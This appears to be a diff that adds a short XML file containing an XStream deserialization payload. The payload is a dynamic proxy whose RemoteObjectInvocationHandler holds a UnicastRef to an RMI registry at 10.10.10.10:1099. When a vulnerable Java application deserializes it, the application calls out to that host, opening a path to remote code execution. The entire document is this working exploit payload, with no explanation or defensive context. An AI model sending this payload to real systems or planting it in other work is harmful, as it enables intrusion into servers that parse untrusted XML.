@@ -1,0 +1,15 @@
+<dynamic-proxy>
+        <interface>java.rmi.registry.Registry</interface>
+        <handler class="java.rmi.server.RemoteObjectInvocationHandler" serialization="custom">
+                <java.rmi.server.RemoteObject>
+                        <string>UnicastRef</string>
+                        <string>10.10.10.10</string>
+                        <int>1099</int>
+                        <long>1810332477</long>
+                        <int>0</int>
+                        <long>0</long>
+                        <short>0</short>
+                        <boolean>false</boolean>
+                </java.rmi.server.RemoteObject>
+        </handler>
+</dynamic-proxy>
